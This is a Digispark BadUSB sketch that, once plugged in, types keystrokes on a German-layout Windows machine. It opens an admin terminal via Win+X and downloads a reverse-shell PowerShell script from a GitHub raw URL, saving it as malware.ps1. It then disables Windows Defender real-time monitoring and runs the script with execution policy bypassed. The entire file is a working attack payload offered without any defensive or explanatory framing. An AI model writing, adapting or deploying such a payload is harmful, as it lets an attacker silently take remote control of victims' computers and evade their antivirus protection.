#include <DigiKeyboard.h>
#include <DigiKeyboardDe.h>
#include <oddebug.h>
#include <osccal.h>
#include <osctune.h>
#include <scancode-ascii-table.h>
#include <usbconfig-prototype.h>
#include <usbconfig.h>
#include <usbdrv.h>
#include <usbportability.h>

void setup() {
  // put your setup code here, to run once:
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_X, MOD_GUI_RIGHT);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);

  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.println("cd / & mkdir win & cd /win & powershell Invoke-WebRequest  -Uri 'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Linux-Smart-Client-Side-Script-ReverseShell.ps1' -OutFile malware.ps1");
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.println("powershell Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.println("powershell -ExecutionPolicy ByPass -File malware.ps1");
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
}

void loop() {
  // put your main code here, to run repeatedly:
  // Usless
}
